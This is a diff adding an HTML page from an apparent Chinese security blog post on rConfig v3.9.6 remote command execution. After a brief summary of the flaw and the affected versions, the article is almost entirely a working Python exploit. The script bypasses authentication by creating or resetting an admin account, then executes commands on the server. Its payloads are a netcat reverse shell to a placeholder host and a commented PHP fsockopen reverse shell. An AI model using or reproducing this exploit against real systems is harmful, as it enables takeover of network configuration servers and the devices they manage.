@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="rConfig v3.9.6 远程命令执行一、漏洞简介rConfig是”开源网络设备配置管理实用程序，可对设备进行频繁的配置快照。开源，由NetworkArchitects构建-我们知道您的需求！” rConfig远程未经身份验证的RCE中的两个漏洞。一个漏洞允许未经身份验证的用户进行身份验证，另一个漏洞（身份验证后）允许攻击者执行任意代码。 厂商最初的反应非常迅速，并且立刻发布了一个更新版本（v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/rConfig/rConfig%20v3.9.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="rConfig v3.9.6 远程命令执行一、漏洞简介rConfig是”开源网络设备配置管理实用程序，可对设备进行频繁的配置快照。开源，由NetworkArchitects构建-我们知道您的需求！” rConfig远程未经身份验证的RCE中的两个漏洞。一个漏洞允许未经身份验证的用户进行身份验证，另一个漏洞（身份验证后）允许攻击者执行任意代码。 厂商最初的反应非常迅速，并且立刻发布了一个更新版本（v">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/rConfigv3.9.6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png">
+<meta property="article:published_time" content="2022-07-08T06:26:03.193Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/rConfigv3.9.6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-rConfig/rConfig v3.9.6 远程命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/rConfig/rConfig%20v3.9.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.193Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="rConfig-v3-9-6-远程命令执行"><a href="#rConfig-v3-9-6-远程命令执行" class="headerlink" title="rConfig v3.9.6 远程命令执行"></a>rConfig v3.9.6 远程命令执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>rConfig是”开源网络设备配置管理实用程序，可对设备进行频繁的配置快照。开源，由Network<br>Architects构建-我们知道您的需求！”</p>
+<p>rConfig远程未经身份验证的RCE中的两个漏洞。一个漏洞允许未经身份验证的用户进行身份验证，另一个漏洞（身份验证后）允许攻击者执行任意代码。</p>
+<p>厂商最初的反应非常迅速，并且立刻发布了一个更新版本（v3.9.6），我们最初是在v3.9.5上验证了该漏洞。但是我们发现，v3.9.6版本中同样存在安全漏洞，并将此情况反应给了厂商。目前为止，我们还不知道有没有安全补丁能够解决或缓解这两个漏洞所带来的影响。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>rConfig v3.9.6 及其之前版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
+<p>rConfig.py 需要修改代码里面的部分内容</p>
+</blockquote>
+<p><img src="/resource/rConfigv3.9.6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/rId25.png" alt="1.png"></p>
+<pre><code>import requests
+
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+
+import urllib3
+
+import re
+
+#from bs4 import BeautifulSoup
+
+ 
+
+urllib3.disable_warnings()
+
+ 
+
+url=&quot;https://x.x.x.x/&quot; #change this to fit your URL (adding the last slash)
+
+payload=&quot;nc y.y.y.y 9001 -e /bin/sh&quot;  #change this to whatever payload you want
+
+payload_rce= &quot;fileName=../www/test.php&amp;code=&lt;%3fphp+echo+system(&#39;ls&#39;)%3b%3f&gt;&amp;id=3&quot; #if you want to use Method 2 for RCE, use a PHP, urlencoded payload as the value of the code parameter
+
+ 
+
+print(&quot;Connecting to: &#123;&#125;&quot;.format(url))
+
+print(&quot;Connect back is set to: &#123;&#125;, please launch &#39;nc -lv 9001&#39;&quot;.format(payload))
+
+ 
+
+x = requests.get(url+&quot;login.php&quot;, verify=False)
+
+version = re.search(&quot;&lt;p&gt;(.*)&lt;span&gt;&quot;, x.text)
+
+version = version.group(1)
+
+ 
+
+if version == &quot;rConfig Version 3.9.5&quot;:
+
+   print(&quot;Version 3.9.5 confirmed&quot;)
+
+else:
+
+   print(&quot;Version is &quot;+version+ &quot; it may not be vulnerable&quot;)
+
+ 
+
+payload_final=&quot;;&quot;+payload
+
+referer=url+&quot;useradmin.php&quot;
+
+origin=url
+
+proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;&#125; #in case you need to debug the exploit with Burp, add &#39;, proxies=proxies&#39; to any request
+
+ 
+
+def createuser():
+
+ 
+
+    multipart_data = MultipartEncoder(
+
+       fields=&#123;
+
+               &#39;username&#39;: &#39;test&#39;,
+
+               &#39;password&#39;: &#39;Testing1@&#39;, #password should have a capital letter, lowercase, number and a symbol
+
+               &#39;passconf&#39;: &#39;Testing1@&#39;,
+
+               &#39;email&#39;: &#39;test@test.com&#39;,
+
+               &#39;ulevelid&#39;: &#39;9&#39;,
+
+               &#39;add&#39;: &#39;add&#39;,
+
+               &#39;editid&#39;: &#39;&#39;
+
+              &#125;
+
+       )
+
+    headers = &#123;&#39;Content-Type&#39;: multipart_data.content_type, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Referer&quot;: referer, &quot;Origin&quot;:origin&#125;
+
+    cookies = &#123;&#39;PHPSESSID&#39;: &#39;test&#39;&#125;
+
+    response = requests.post(url+&#39;lib/crud/userprocess.php&#39;, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False)
+
+    if &quot;error&quot; not in response.text:
+
+        print(&quot;(+) User test created&quot;)
+
+    else:
+
+        print(&quot;(-) User couldn&#39;t be created, please debug the exploit&quot;)
+
+ 
+
+ 
+
+def exploit():
+
+    payload = &#123;
+
+    &#39;user&#39;: &#39;test&#39;,
+
+    &#39;pass&#39;: &#39;Testing1@&#39;,
+
+    &#39;sublogin&#39;: &#39;1&#39;
+
+&#125;
+
+    with requests.Session() as s:
+
+         p = s.post(url+&#39;lib/crud/userprocess.php&#39;, data=payload, verify=False)
+
+         if &quot;Stephen Stack&quot; in p.text:
+
+            print(&quot;(-) Exploit failed, could not login as user test&quot;)
+
+         else:
+
+            print(&quot;(+) Log in as test completed&quot;)
+
+            params = &#123;&#39;path&#39;:&#39;test&#39;,
+
+                      &#39;ext&#39;: payload_final
+
+                     &#125;
+
+            rce=s.get(url+&#39;lib/ajaxHandlers/ajaxArchiveFiles.php&#39;, verify=False, params=params)
+
+            if &quot;success&quot; in rce.text:
+
+                print(&quot;(+) Payload executed successfully&quot;)
+
+            else:
+
+                print(&quot;(-) Error when executing payload, please debug the exploit&quot;) #if you used method 2 to auth bypass and 1 for RCE, ignore this message
+
+    payload = &#123;
+
+    &#39;user&#39;: &#39;admin&#39;,
+
+    &#39;pass&#39;: &#39;Testing1@&#39;,
+
+    &#39;sublogin&#39;: &#39;1&#39;
+
+&#125;
+
+    with requests.Session() as s:
+
+         p = s.post(url+&#39;lib/crud/userprocess.php&#39;, data=payload, verify=False)
+
+         if &quot;Stephen Stack&quot; in p.text:
+
+            print(&quot;(-) Exploit failed, could not login as user test&quot;)
+
+         else:
+
+            print(&quot;(+) Log in as test completed&quot;)
+
+            params = &#123;&#39;path&#39;:&#39;test&#39;,
+
+                      &#39;ext&#39;: payload_final
+
+                     &#125;
+
+            rce=s.get(url+&#39;lib/ajaxHandlers/ajaxArchiveFiles.php&#39;, verify=False, params=params)
+
+            if &quot;success&quot; in rce.text:
+
+                print(&quot;(+) Payload executed successfully&quot;)
+
+            else:
+
+                print(&quot;(-) Error when executing payload, please debug the exploit&quot;)
+
+ 
+
+ 
+
+def user_enum_update():
+
+    users=requests.get(url+&#39;useradmin.inc.php&#39;, verify=False)
+
+    #matchObj = re.findall(r&#39;&lt;td align=&quot;center&quot;&gt;(.*?)&lt;/td&gt;&#39;, users.text, re.M|re.I|re.S)
+
+    
+
+    if &quot;admin&quot; in users.text:
+
+      print(&quot;(+) The admin user is present in this rConfig instance&quot;)
+
+      multipart_data = MultipartEncoder(
+
+       fields=&#123;
+
+               &#39;username&#39;: &#39;admin&#39;,
+
+               &#39;password&#39;: &#39;Testing1@&#39;, #password should have a capital letter, lowercase, number and a symbol
+
+               &#39;passconf&#39;: &#39;Testing1@&#39;,
+
+               &#39;email&#39;: &#39;admin@admin.com&#39;,
+
+               &#39;ulevelid&#39;: &#39;9&#39;,
+
+               &#39;add&#39;: &#39;add&#39;,
+
+               &#39;editid&#39;: &#39;1&#39; #you may need to increment this if you want to reset the password of a different user
+
+              &#125;
+
+       )
+
+      headers = &#123;&#39;Content-Type&#39;: multipart_data.content_type, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Referer&quot;: referer, &quot;Origin&quot;:origin&#125;
+
+      cookies = &#123;&#39;PHPSESSID&#39;: &#39;test&#39;&#125;
+
+      response = requests.post(url+&#39;lib/crud/userprocess.php&#39;, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False)
+
+      if &quot;error&quot; not in response.text:
+
+          print(&quot;(+) The new password for the admin user is Testing1@&quot;)
+
+      else:
+
+          print(&quot;(-) Admin user couldn&#39;t be edited, please debug the exploit&quot;)
+
+    elif  &quot;Admin&quot; in users.text:
+
+       print(&quot;(+) There is at least one Admin user, check &quot;+ str(url)+&quot;useradmin.inc.php manually and modify the exploit accordingly (erase the if-elif statements of this function and modify the user payload)&quot;)
+
+    
+
+def template():
+
+    payload = &#123;
+
+    &#39;user&#39;: &#39;admin&#39;,
+
+    &#39;pass&#39;: &#39;Testing1@&#39;,
+
+    &#39;sublogin&#39;: &#39;1&#39;
+
+&#125;
+
+    
+
+    #&lt;%3fphp+%24sock%3Dfsockopen%28%22192.168.1.13%22%2C1234%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%3f&gt;
+
+    headers_rce = &#123;&#39;Content-Type&#39;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Referer&quot;: url+&quot;deviceConnTemplates.php&quot;, &quot;Origin&quot;:origin, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;&#125;
+
+    with requests.Session() as s:
+
+         p = s.post(url+&#39;lib/crud/userprocess.php&#39;, data=payload, verify=False)
+
+         if &quot;Stephen Stack&quot; in p.text:
+
+            print(&quot;(-) Exploit failed, could not login as user test&quot;)
+
+         else:
+
+            print(&quot;(+) Log in as admin completed&quot;)
+
+            rce=s.post(url+&#39;lib/ajaxHandlers/ajaxEditTemplate.php&#39;, verify=False, data=payload_rce, headers=headers_rce)
+
+            if &quot;success&quot; in rce.text:
+
+                print(&quot;(+) File created&quot;)
+
+                rce_req = s.get(url+&#39;test.php.yml&#39;, verify=False)
+
+                print(&quot;(+) Command results: &quot;)
+
+                print(rce_req.text)
+
+            else:
+
+                print(&quot;(-) Error when executing payload, please debug the exploit&quot;)
+
+ 
+
+def main():
+
+    print(&quot;Remote Code Execution + Auth bypass rConfig 3.9.5 by Daniel Monzón&quot;)
+
+    print(&quot;In the last stage if your payload is a reverse shell, the exploit may not launch the success message, but check your netcat ;)&quot;)
+
+    print(&quot;Note: preferred method for auth bypass is 1, because it is less &#39;invasive&#39;&quot;)
+
+    print(&quot;Note2: preferred method for RCE is 2, as it does not need you to know if, for example, netcat has been installed in the target machine&quot;)
+
+    print(&#39;&#39;&#39;Choose method for authentication bypass:
+
+        1) User creation
+
+        2) User enumeration + User edit &#39;&#39;&#39;)
+
+    auth_bypass=str(input(&quot;Method&gt;&quot;))
+
+    if auth_bypass == &quot;1&quot;:
+
+       createuser()
+
+    elif auth_bypass == &quot;2&quot;:
+
+       user_enum_update()
+
+    print(&#39;&#39;&#39;Choose method for RCE:
+
+        1) Unsafe call to exec()
+
+        2) Template edit &#39;&#39;&#39;)
+
+    rce_method=str(input(&quot;Method&gt;&quot;))
+
+    if rce_method == &quot;1&quot;:
+
+       exploit()
+
+    elif rce_method == &quot;2&quot;:
+
+       template()
+
+main()
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/rConfig/rConfig%20v3.9.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qv7100fly8v1aozi4ptm" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/rConfig/%EF%BC%88CVE-2019-16662%EF%BC%89%EF%BC%88CVE-2019-16663%EF%BC%89rConfig%20v3.9.2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/RaspAP/%EF%BC%88CVE-2020-24572%EF%BC%89RaspAP%202.5%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
